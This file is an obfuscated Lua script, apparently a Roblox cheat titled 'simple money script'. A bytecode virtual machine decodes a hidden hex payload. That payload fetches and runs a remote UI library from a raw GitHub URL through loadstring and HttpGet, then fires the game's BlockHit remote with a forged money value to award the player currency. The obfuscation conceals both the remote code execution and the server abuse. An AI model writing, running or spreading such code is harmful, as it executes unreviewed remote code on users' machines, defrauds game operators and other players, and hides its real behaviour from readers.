local Tonumber = tonumber;
local StringByte = string.byte;
local StringChar = string.char;
local StringSub = string.sub;
local StringGsub = string.gsub;
local StringRep = string.rep;
local TableConcat = table.concat;
local Insert = table.insert;
local MathLdexp = math.ldexp;
local GetFenv = getfenv or function()
    return _ENV;
end;
local Setmetatable = setmetatable;
local Pcall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local Tonumber = tonumber;
local function Run(ByteString, VMEnv, ...)
    local v18 = 1;
    local v19;
    ByteString = StringGsub(StringSub(ByteString, 5), "..", function(v20)
        if (StringByte(v20, 2) == 81) then
            v19 = Tonumber(StringSub(v20, 1, 1));
            return "";
        else
            local v21 = 0;
            local v22;
            while true do
                if (v21 == 0) then
                    v22 = StringChar(Tonumber(v20, 16));
                    if v19 then
                        local v23 = 0;
                        local v24;
                        while true do
                            if (v23 == 1) then
                                return v24;
                            end
                            if (v23 == 0) then
                                v24 = StringRep(v22, v19);
                                v19 = nil;
                                v23 = 1;
                            end
                        end
                    else
                        return v22;
                    end
                    break;
                end
            end
        end
    end);
    local function v25(v26, v27, v28)
        if v28 then
            local v29 = (v26 / ((2) ^ (v27 - (1)))) % ((2) ^ (((v28 - (1)) - (v27 - 1)) + 1));
            return v29 - (v29 % (1));
        else
            local v30 = (2) ^ (v27 - (1));
            return (((v26 % (v30 + v30)) >= v30) and (1)) or (0);
        end
    end
    local function v31()
        local v32 = 0;
        local v33;
        while true do
            if (v32 == (1)) then
                return v33;
            end
            if (v32 == (0)) then
                v33 = StringByte(ByteString, v18, v18);
                v18 = v18 + 1 + 0;
                v32 = 1;
            end
        end
    end
    local function v34()
        local v35, v36 = StringByte(ByteString, v18, v18 + (2));
        v18 = v18 + (2);
        return (v36 * (256)) + v35;
    end
    local function v37()
        local v38 = 0;
        local v39;
        local v40;
        local v41;
        local v42;
        while true do
            if (v38 == (1)) then
                return (v42 * 16777216) + (v41 * (65536)) + (v40 * (256)) + v39;
            end
            if (v38 == (0)) then
                v39, v40, v41, v42 = StringByte(ByteString, v18, v18 + (3));
                v18 = v18 + 3 + 1;
                v38 = 1;
            end
        end
    end
    local function v43()
        local v44 = v37();
        local v45 = v37();
        local v46 = 1;
        local v47 = (v25(v45, 1, 20) * (4294967296)) + v44;
        local v48 = v25(v45, 21, 31);
        local v49 = ((v25(v45, 32) == (1)) and -1) or 1;
        if (v48 == (0)) then
            if (v47 == (0)) then
                return v49 * 0;
            else
                v48 = 1;
                v46 = 0;
            end
        elseif (v48 == 2047) then
            return ((v47 == (0)) and (v49 * ((1) / (0)))) or (v49 * NaN);
        end
        return MathLdexp(v49, v48 - (1023)) * (v46 + (v47 / (4503599627370496)));
    end
    local function v50(v51)
        local v52;
        if not v51 then
            v51 = v37();
            if (v51 == (0)) then
                return "";
            end
        end
        v52 = StringSub(ByteString, v18, (v18 + v51) - (1));
        v18 = v18 + v51;
        local v53 = {};
        for v54 = 1, #v52 do
            v53[v54] = StringChar(StringByte(StringSub(v52, v54, v54)));
        end
        return TableConcat(v53);
    end
    local v55 = v37;
    local function v56(...)
        return { ... }, Select("#", ...);
    end
    local function Deserialize()
        local v71 = (function()
            return function(v58, v59, v60, v61, v62, v63, v64, v65)
                local v66 = (function()
                    return 0;
                end)();
                local v67 = (function()
                    return ;
                end)();
                local v68 = (function()
                    return ;
                end)();
                while true do
                    if (v66 == 1) then
                        if (v67 == 1) then
                            v68 = (function()
                                return v61() ~= (0);
                            end)();
                        elseif (v67 == 2) then
                            v68 = (function()
                                return v62();
                            end)();
                        elseif (v67 ~= 3) then
                        else
                            v68 = (function()
                                return v63();
                            end)();
                        end
                        v64[v65] = (function()
                            return v68;
                        end)();
                        break;
                    end
                    if ((0) == v66) then
                        local v69 = (function()
                            return 0;
                        end)();
                        local v70 = (function()
                            return ;
                        end)();
                        while true do
                            if (v69 == (0)) then
                                v70 = (function()
                                    return 0;
                                end)();
                                while true do
                                    if (v70 == (0)) then
                                        v67 = (function()
                                            return v61();
                                        end)();
                                        v68 = (function()
                                            return nil;
                                        end)();
                                        v70 = (function()
                                            return 1;
                                        end)();
                                    end
                                    if (v70 == 1) then
                                        v66 = (function()
                                            return 1;
                                        end)();
                                        break;
                                    end
                                end
                                break;
                            end
                        end
                    end
                end
                return v66, v67, v68, v61, v62, v63, v64, v65;
            end;
        end)();
        local v78 = (function()
            return function(v72, v73, v74)
                local v75 = (function()
                    return 0;
                end)();
                local v76 = (function()
                    return ;
                end)();
                while true do
                    if (v75 ~= (0)) then
                    else
                        v76 = (function()
                            return 0;
                        end)();
                        while true do
                            if (v76 ~= (0)) then
                            else
                                local v77 = (function()
                                    return 0;
                                end)();
                                while true do
                                    if (v77 == (0)) then
                                        v72[v73 - 1] = (function()
                                            return v74();
                                        end)();
                                        return v72, v73, v74;
                                    end
                                end
                            end
                        end
                        break;
                    end
                end
            end;
        end)();
        local v79 = (function()
            return {};
        end)();
        local v80 = (function()
            return {};
        end)();
        local v81 = (function()
            return {};
        end)();
        local v82 = (function()
            return { v79, v80, nil, v81 };
        end)();
        local v83 = (function()
            return v37();
        end)();
        local v84 = (function()
            return {};
        end)();
        for v85 = 1, v83 do
            FlatIdent_7366E, Type, Cons, v31, v43, v50, v84, v85 = (function()
                return v71(FlatIdent_7366E, Type, Cons, v31, v43, v50, v84, v85);
            end)();
        end
        v82[3] = (function()
            return v31();
        end)();
        for v86 = 1, v37() do
            local v87 = (function()
                return 0;
            end)();
            local v88 = (function()
                return ;
            end)();
            while true do
                if (v87 == (0)) then
                    v88 = (function()
                        return v31();
                    end)();
                    if (v25(v88, 1, 1) == (0)) then
                        local v89 = (function()
                            return 0;
                        end)();
                        local v90 = (function()
                            return ;
                        end)();
                        local v91 = (function()
                            return ;
                        end)();
                        local v92 = (function()
                            return ;
                        end)();
                        while true do
                            if (v89 == 3) then
                                if (v25(v91, 3, 3) == 1) then
                                    v92[4] = (function()
                                        return v84[v92[4]];
                                    end)();
                                end
                                v79[v86] = (function()
                                    return v92;
                                end)();
                                break;
                            end
                            if ((2) == v89) then
                                if (v25(v91, 1, 1) ~= 1) then
                                else
                                    v92[2] = (function()
                                        return v84[v92[2]];
                                    end)();
                                end
                                if (v25(v91, 2, 2) == 1) then
                                    v92[3] = (function()
                                        return v84[v92[3]];
                                    end)();
                                end
                                v89 = (function()
                                    return 3;
                                end)();
                            end
                            if (v89 == (1)) then
                                local v93 = (function()
                                    return 0;
                                end)();
                                local v94 = (function()
                                    return ;
                                end)();
                                while true do
                                    if (v93 == (0)) then
                                        v94 = (function()
                                            return 0;
                                        end)();
                                        while true do
                                            if (v94 == (0)) then
                                                local v95 = (function()
                                                    return 0;
                                                end)();
                                                while true do
                                                    if (v95 == 1) then
                                                        v94 = (function()
                                                            return 1;
                                                        end)();
                                                        break;
                                                    end
                                                    if (v95 ~= (0)) then
                                                    else
                                                        v92 = (function()
                                                            return { v34(), v34(), nil, nil };
                                                        end)();
                                                        if (v90 == (0)) then
                                                            local v96 = (function()
                                                                return 0;
                                                            end)();
                                                            local v97 = (function()
                                                                return ;
                                                            end)();
                                                            while true do
                                                                if ((0) == v96) then
                                                                    v97 = (function()
                                                                        return 0;
                                                                    end)();
                                                                    while true do
                                                                        if ((0) ~= v97) then
                                                                        else
                                                                            v92[3] = (function()
                                                                                return v34();
                                                                            end)();
                                                                            v92[4] = (function()
                                                                                return v34();
                                                                            end)();
                                                                            break;
                                                                        end
                                                                    end
                                                                    break;
                                                                end
                                                            end
                                                        elseif (v90 == 1) then
                                                            v92[3] = (function()
                                                                return v37();
                                                            end)();
                                                        elseif (v90 == (2)) then
                                                            v92[3] = (function()
                                                                return v37() - (65536);
                                                            end)();
                                                        elseif (v90 ~= 3) then
                                                        else
                                                            local v98 = (function()
                                                                return 0;
                                                            end)();
                                                            local v99 = (function()
                                                                return ;
                                                            end)();
                                                            while true do
                                                                if (v98 == (0)) then
                                                                    v99 = (function()
                                                                        return 0;
                                                                    end)();
                                                                    while true do
                                                                        if (v99 == (0)) then
                                                                            v92[3] = (function()
                                                                                return v37() - (65536);
                                                                            end)();
                                                                            v92[4] = (function()
                                                                                return v34();
                                                                            end)();
                                                                            break;
                                                                        end
                                                                    end
                                                                    break;
                                                                end
                                                            end
                                                        end
                                                        v95 = (function()
                                                            return 1;
                                                        end)();
                                                    end
                                                end
                                            end
                                            if (v94 == (1)) then
                                                v89 = (function()
                                                    return 2;
                                                end)();
                                                break;
                                            end
                                        end
                                        break;
                                    end
                                end
                            end
                            if (v89 ~= (0)) then
                            else
                                local v100 = (function()
                                    return 0;
                                end)();
                                local v101 = (function()
                                    return ;
                                end)();
                                while true do
                                    if (v100 == (0)) then
                                        v101 = (function()
                                            return 0;
                                        end)();
                                        while true do
                                            if (1 ~= v101) then
                                            else
                                                v89 = (function()
                                                    return 1;
                                                end)();
                                                break;
                                            end
                                            if (v101 == (0)) then
                                                v90 = (function()
                                                    return v25(v88, 2, 3);
                                                end)();
                                                v91 = (function()
                                                    return v25(v88, 4, 6);
                                                end)();
                                                v101 = (function()
                                                    return 1;
                                                end)();
                                            end
                                        end
                                        break;
                                    end
                                end
                            end
                        end
                    end
                    break;
                end
            end
        end
        for v102 = 1, v37() do
            v80, v102, Deserialize = (function()
                return v78(v80, v102, Deserialize);
            end)();
        end
        return v82;
    end
    local function v103(v104, v105, v106)
        local v107 = v104[1];
        local v108 = v104[2];
        local v109 = v104[3];
        return function(...)
            local v110 = v107;
            local v111 = v108;
            local v112 = v109;
            local v113 = v56;
            local v114 = 1;
            local v115 = -1;
            local v116 = {};
            local v117 = { ... };
            local v118 = Select("#", ...) - (1);
            local v119 = {};
            local v120 = {};
            for v121 = 0, v118 do
                if (v121 >= v112) then
                    v116[v121 - v112] = v117[v121 + (1)];
                else
                    v120[v121] = v117[v121 + 1 + 0];
                end
            end
            local v122 = (v118 - v112) + 1;
            local v123;
            local v124;
            while true do
                v123 = v110[v114];
                v124 = v123[1];
                if (v124 <= (19)) then
                    if (v124 <= (9)) then
                        if ((v124 <= (4)) or (false)) then
                            if ((v124 <= (1)) or (false)) then
                                if ((v124 == 0) or (false)) then
                                    local v125 = v123[2];
                                    v120[v125] = v120[v125]();
                                else
                                    local v126 = 0;
                                    local v127;
                                    while true do
                                        if (v126 == 0) then
                                            v127 = v123[2];
                                            v120[v127](Unpack(v120, v127 + 1, v123[3]));
                                            break;
                                        end
                                    end
                                end
                            elseif ((v124 <= (2)) or (false)) then
                                v120[v123[2]][v123[3]] = v123[4];
                            elseif ((v124 > 3) or (false)) then
                                v120[v123[2]] = v120[v123[3]];
                            elseif (v120[v123[2]] == v123[4]) then
                                v114 = v114 + (1);
                            else
                                v114 = v123[3];
                            end
                        elseif (v124 <= 6) then
                            if (v124 == (5)) then
                                local v128 = 0;
                                local v129;
                                while true do
                                    if (((0) == v128) or (false)) then
                                        v129 = v123[2];
                                        v120[v129] = v120[v129](Unpack(v120, v129 + 1, v123[3]));
                                        break;
                                    end
                                end
                            else
                                for v130 = v123[2], v123[3] do
                                    v120[v130] = nil;
                                end
                            end
                        elseif (v124 <= (7)) then
                            v120[v123[2]] = v123[3];
                        elseif (v124 == (8)) then
                            v120[v123[2]][v123[3]] = v120[v123[4]];
                        else
                            v120[v123[2]] = v120[v123[3]][v123[4]];
                        end
                    elseif (v124 <= (14)) then
                        if (v124 <= (11)) then
                            if (v124 == 10) then
                                v114 = v123[3];
                            else
                                v120[v123[2]][v123[3]] = v123[4];
                            end
                        elseif (v124 <= (12)) then
                            if (v120[v123[2]] == v123[4]) then
                                v114 = v114 + 1;
                            else
                                v114 = v123[3];
                            end
                        elseif ((v124 == (13)) or (false)) then
                            v120[v123[2]] = {};
                        else
                            local v131 = 0;
                            local v132;
                            while true do
                                if (v131 == (0)) then
                                    v132 = v123[2];
                                    v120[v132] = v120[v132](Unpack(v120, v132 + (1), v115));
                                    break;
                                end
                            end
                        end
                    elseif (v124 <= (16)) then
                        if ((v124 > (15)) or (false)) then
                            local v133 = v123[2];
                            v120[v133] = v120[v133]();
                        else
                            v120[v123[2]] = v103(v111[v123[3]], nil, v106);
                        end
                    elseif (v124 <= (17)) then
                        local v134 = v123[2];
                        v120[v134](Unpack(v120, v134 + 1 + 0, v123[3]));
                    elseif (v124 == 18) then
                        v120[v123[2]] = v106[v123[3]];
                    else
                        v114 = v123[3];
                    end
                elseif (v124 <= (29)) then
                    if ((v124 <= (24)) or (false)) then
                        if (v124 <= (21)) then
                            if (v124 > (20)) then
                                v120[v123[2]][v123[3]] = v120[v123[4]];
                            else
                                local v135 = 0;
                                local v136;
                                local v137;
                                while true do
                                    if (v135 == (1)) then
                                        v120[v136 + (1)] = v137;
                                        v120[v136] = v137[v123[4]];
                                        break;
                                    end
                                    if ((0) == v135) then
                                        v136 = v123[2];
                                        v137 = v120[v123[3]];
                                        v135 = 1;
                                    end
                                end
                            end
                        elseif (v124 <= 22) then
                            for v138 = v123[2], v123[3] do
                                v120[v138] = nil;
                            end
                        elseif (v124 == (23)) then
                            local v139 = v123[2];
                            v120[v139](Unpack(v120, v139 + 1, v115));
                        else
                            local v140 = v123[2];
                            local v141, v142 = v113(v120[v140](Unpack(v120, v140 + 1, v123[3])));
                            v115 = (v142 + v140) - (1);
                            local v143 = 0;
                            for v144 = v140, v115 do
                                local v145 = 0;
                                while true do
                                    if (v145 == (0)) then
                                        v143 = v143 + 1 + 0 + (0);
                                        v120[v144] = v141[v143];
                                        break;
                                    end
                                end
                            end
                        end
                    elseif (v124 <= 26) then
                        if (v124 == (25)) then
                            v120[v123[2]] = v120[v123[3]][v123[4]];
                        else
                            local v146 = v123[2];
                            local v147, v148 = v113(v120[v146](v120[v146 + (1)]));
                            v115 = (v148 + v146) - (1);
                            local v149 = 0;
                            for v150 = v146, v115 do
                                local v151 = 0;
                                while true do
                                    if (v151 == (0)) then
                                        v149 = v149 + (1);
                                        v120[v150] = v147[v149];
                                        break;
                                    end
                                end
                            end
                        end
                    elseif (v124 <= (27)) then
                        local v152 = 0;
                        local v153;
                        local v154;
                        local v155;
                        local v156;
                        while true do
                            if (v152 == (2)) then
                                for v157 = v153, v115 do
                                    local v158 = 0;
                                    while true do
                                        if ((v158 == (0)) or (false)) then
                                            v156 = v156 + 1;
                                            v120[v157] = v154[v156];
                                            break;
                                        end
                                    end
                                end
                                break;
                            end
                            if (v152 == (0)) then
                                v153 = v123[2];
                                v154, v155 = v113(v120[v153](Unpack(v120, v153 + 1 + 0, v123[3])));
                                v152 = 1;
                            end
                            if (v152 == (1)) then
                                v115 = (v155 + v153) - (1);
                                v156 = 0;
                                v152 = 2;
                            end
                        end
                    elseif (v124 > (28)) then
                        v120[v123[2]] = v123[3];
                    else
                        v120[v123[2]] = v106[v123[3]];
                    end
                elseif (v124 <= (34)) then
                    if ((v124 <= 31) or (false)) then
                        if ((v124 > (30)) or (false)) then
                            local v159 = v123[2];
                            local v160 = v120[v123[3]];
                            v120[v159 + (1)] = v160;
                            v120[v159] = v160[v123[4]];
                        else
                            do
                                return ;
                            end
                        end
                    elseif (v124 <= (32)) then
                        v120[v123[2]] = v103(v111[v123[3]], nil, v106);
                    elseif (v124 > (33)) then
                        v120[v123[2]] = v120[v123[3]];
                    else
                        local v161 = 0;
                        local v162;
                        while true do
                            if (v161 == (0)) then
                                v162 = v123[2];
                                v120[v162] = v120[v162](Unpack(v120, v162 + (1), v123[3]));
                                break;
                            end
                        end
                    end
                elseif (v124 <= (36)) then
                    if (v124 == (35)) then
                        local v163 = v123[2];
                        v120[v163] = v120[v163](Unpack(v120, v163 + 1 + 0, v115));
                    else
                        local v164 = 0;
                        local v165;
                        while true do
                            if (v164 == 0) then
                                v165 = v123[2];
                                v120[v165](Unpack(v120, v165 + 1, v115));
                                break;
                            end
                        end
                    end
                elseif (v124 <= (37)) then
                    local v166 = 0;
                    local v167;
                    local v168;
                    local v169;
                    local v170;
                    while true do
                        if (v166 == (0)) then
                            v167 = v123[2];
                            v168, v169 = v113(v120[v167](v120[v167 + (1)]));
                            v166 = 1;
                        end
                        if (v166 == (1)) then
                            v115 = (v169 + v167) - (1);
                            v170 = 0;
                            v166 = 2;
                        end
                        if (v166 == (2)) then
                            for v171 = v167, v115 do
                                local v172 = 0;
                                while true do
                                    if (v172 == (0)) then
                                        v170 = v170 + (1);
                                        v120[v171] = v168[v170];
                                        break;
                                    end
                                end
                            end
                            break;
                        end
                    end
                elseif (v124 > (38)) then
                    do
                        return ;
                    end
                else
                    v120[v123[2]] = {};
                end
                v114 = v114 + (1);
            end
        end;
    end
    return v103(Deserialize(), {}, VMEnv)(...);
end
return Run("LOL!0C3Q00028Q00026Q00F03F030A3Q004E657753656374696F6E03053Q006D6F6E6579030D3Q0043726561746554657874626F7803093Q00476574204D6F6E6579030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574034A3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F626C2Q6F6462612Q6C2F2D6261636B2D7570732D666F722D6C6962732F6D61696E2F77697A61726403093Q004E657757696E646F7703133Q0073696D706C65206D6F6E657920736372697074001E3Q0012073Q00014Q0016000100033Q0026033Q000D0001000200040A3Q000D000100201F000400020003001207000600044Q00210004000600022Q0022000300043Q00201F000400030005001207000600063Q00020F00076Q000100040007000100040A3Q001D00010026033Q00020001000100040A3Q0002000100121C000400073Q00121C000500083Q00201F0005000500090012070007000A4Q001B000500074Q002300043Q00022Q00100004000100022Q0022000100043Q00201F00040001000B0012070006000C4Q00210004000600022Q0022000200043Q0012073Q00023Q00040A3Q000200012Q001E3Q00013Q00013Q00123Q00028Q00026Q00F03F03083Q00556E636F2Q6D6F6E027Q0040030A3Q006D6F6E657956616C756503093Q00626C6F636B4E616D6503063Q006368616E6365026Q00104003023Q00696403053Q00636F6C6F720003043Q0067616D65030A3Q004765745365727669636503113Q005265706C69636174656453746F7261676503073Q0052656D6F74657303083Q00426C6F636B486974030A3Q004669726553657276657203063Q00756E7061636B01253Q001207000100014Q0016000200033Q0026030001001E0001000200040A3Q001E0001002603000200040001000100040A3Q000400012Q002600043Q000200300B0004000200032Q002600053Q0005001015000500053Q00300B00050006000300300B00050007000800300B00050009000400300B0005000A000B0010150004000400052Q0022000300043Q00121C0004000C3Q00201F00040004000D0012070006000E4Q002100040006000200201900040004000F00201900040004001000201F00040004001100121C000600124Q0022000700034Q001A000600074Q001700043Q000100040A3Q0024000100040A3Q0004000100040A3Q00240001002603000100020001000100040A3Q00020001001207000200014Q0016000300033Q001207000100023Q00040A3Q000200012Q001E3Q00017Q00", GetFenv(), ...);